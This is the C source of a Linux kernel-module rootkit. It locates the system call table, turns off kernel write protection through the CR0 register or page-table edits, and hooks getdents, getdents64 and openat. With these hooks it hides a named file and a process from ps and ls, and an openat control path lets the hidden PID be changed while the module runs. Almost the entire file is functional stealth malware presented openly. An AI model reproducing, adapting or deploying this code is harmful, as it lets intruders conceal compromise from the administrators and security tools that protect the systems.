/*
 * main.c: a loadable kernel module,
 * hiding processes and files from ps and ls.
 * changes the hide_pid dynamicly
 * when `cat` on `CONTROL_PREFIX`+PID  it changes the `hidden_pid`. 
*/
#include "main.h"

static asmlinkage long (*ref_sys_openat)(const struct pt_regs *);

bool prefix(const char *pre, const char *str)
{
    return strncmp(pre, str, strlen(pre)) == 0;
}

asmlinkage int new_sys_openat(const struct pt_regs *regs)
{
    int size;
    char *pathname = regs->si;
    pid_t pid;
    char scanf_format[sizeof(CONTROL_PREFIX) + 2];
    strncpy(scanf_format, CONTROL_PREFIX, sizeof(CONTROL_PREFIX));
    scanf_format[sizeof(CONTROL_PREFIX)-1] = '%';
    scanf_format[sizeof(CONTROL_PREFIX)] = 's';
    scanf_format[sizeof(CONTROL_PREFIX)+1] = NULL;
    
    if (prefix(CONTROL_PREFIX, pathname))
    {
        size = sscanf(pathname, scanf_format, hidden_pid);
    }
    return ref_sys_openat(regs);
}

// set page permissions to read write
int make_rw(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte |= _PAGE_RW;
    return 0;
}

// set page permissions to read only
int make_ro(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

bool should_hide_file(char *name)
{
    return (strcmp((char *)name, HIDDEN_NAME) == 0);
}

bool should_hide_process(char *name, bool is_proc)
{
    return (is_proc && strcmp(name, hidden_pid) == 0);
}

int path_to_inode(char *path_name)
{
    struct inode *inode;
    struct path path;
    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
    return inode->i_ino;
}

bool is_in_proc(int inode){
    return (inode == inode_proc);
}

asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
{
    long size;
    long new_size;
    long ret;
    long bpos;
    int unread;
    struct linux_dirent *d, *dirent;
    struct linux_dirent *fake_dirent = NULL;
    int fd;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent *)pt_regs->si;

    size = ref_sys_getdents(pt_regs);

    if (size <= 0)
    {
        ret = size;
        goto end;
    }

    fake_dirent = kmalloc(size, GFP_KERNEL);
    if (fake_dirent == NULL)
    {
        ret = size;
        goto end;
    }
    if (unread = copy_from_user(fake_dirent, dirent, size))
    {
        DEBUG("Failed on copy_from_user");
        ret = size;
        goto end;
    }
    new_size = size;
    
    // assuming that `fake_dirent` referes to the first directory of the folder tree 
    bool is_proc = is_in_proc(fake_dirent->d_ino);
     
    for (bpos = 0; bpos < new_size;)
    {
        d = (struct linux_dirent *)((char *)fake_dirent + bpos);
        if (d->d_ino != 0)
        {
            if (should_hide_file(d->d_name) || should_hide_process(d->d_name, is_proc))
            {
                // delete this entry
                int rest = new_size - (bpos + d->d_reclen);
                int from_ = bpos + d->d_reclen;
                int to_ = bpos;

                struct linux_dirent *from =
                    (struct linux_dirent *)((char *)
                                                fake_dirent +
                                            from_);
                struct linux_dirent *to =
                    (struct linux_dirent *)((char *)
                                                fake_dirent +
                                            to_);

                memcpy(to, from, rest);
                new_size -= d->d_reclen;
                continue;
            }
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent, fake_dirent, new_size))
    {
        ret = -1;
        goto end;
    }

    ret = new_size;

end:
    if (fake_dirent)
        kfree(fake_dirent);

    return ret;
}


asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
{
    long size;
    long new_size;
    long ret;
    long bpos;
    int unread;
    struct linux_dirent64 *d, *dirent;
    struct linux_dirent64 *fake_dirent = NULL;
    int fd;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent64 *)pt_regs->si;

    size = ref_sys_getdents64(pt_regs);

    if (size <= 0)
    {
        ret = size;
        goto end;
    }

    fake_dirent = kmalloc(size, GFP_KERNEL);
    if (fake_dirent == NULL)
    {
        ret = size;
        goto end;
    }
    if (unread = copy_from_user(fake_dirent, dirent, size))
    {
        DEBUG("Failed on copy_from_user");
        ret = size;
        goto end;
    }
    new_size = size;
    
    // assuming that `fake_dirent` referes to the first directory of the folder tree 
    bool is_proc = is_in_proc(fake_dirent->d_ino);
     
    for (bpos = 0; bpos < new_size;)
    {
        d = (struct linux_dirent64 *)((char *)fake_dirent + bpos);
        if (d->d_ino != 0)
        {
            if (should_hide_file(d->d_name) || should_hide_process(d->d_name, is_proc))
            {
                // delete this entry
                int rest = new_size - (bpos + d->d_reclen);
                int from_ = bpos + d->d_reclen;
                int to_ = bpos;

                struct linux_dirent *from =
                    (struct linux_dirent *)((char *)
                                                fake_dirent +
                                            from_);
                struct linux_dirent *to =
                    (struct linux_dirent *)((char *)
                                                fake_dirent +
                                            to_);

                memcpy(to, from, rest);
                new_size -= d->d_reclen;
                continue;
            }
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent, fake_dirent, new_size))
    {
        ret = -1;
        goto end;
    }

    ret = new_size;

end:
    if (fake_dirent)
        kfree(fake_dirent);

    return ret;
}

void force_write_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(val), "+m"(__force_order));
}

void set_syscall_table_rw(void)
{
    #if USE_CR0
        original_cr0 = read_cr0();
        force_write_cr0(original_cr0 & ~0x00010000);
        DEBUG("Modified cr0 to 1");
    #else
        DEBUG("modifiying page rw");
        make_rw(sys_call_table_);
    #endif
}

void set_syscall_table_ro(void)
{
    /*
     * Changing the `sys_call_table` permissions to read only.
    */
    #if USE_CR0
        force_write_cr0(original_cr0);
    #else
        make_ro(sys_call_table_);
    #endif
}

static int __init main_init(void)
{
    DEBUG("Loaded.");
    if (!(sys_call_table_ = kallsyms_lookup_name("sys_call_table")))
    {
        DEBUG("Unable to find the table.");
        return 0;
    }

    DEBUG("Changing the permissions to rw");

    set_syscall_table_rw();
    register(getdents);
    register(getdents64);
    register(openat);
    set_syscall_table_ro();

    DEBUG("Changing the permissions to ro");

    // checking the inode of the directory `/proc`
    // to hide out PID under the parent tree of /proc : /proc/PID
    inode_proc = path_to_inode(proc_path);
    DEBUG("proc inode number %d", inode_proc);
    return 0;
}

static void __exit main_exit(void)
{
    DEBUG("Exiting.");

    if (!sys_call_table_)
        return;
    set_syscall_table_rw();
    unregister(getdents);
    unregister(getdents64);
    unregister(openat);
    set_syscall_table_ro();
}

module_init(main_init);
module_exit(main_exit);

MODULE_LICENSE("GPL");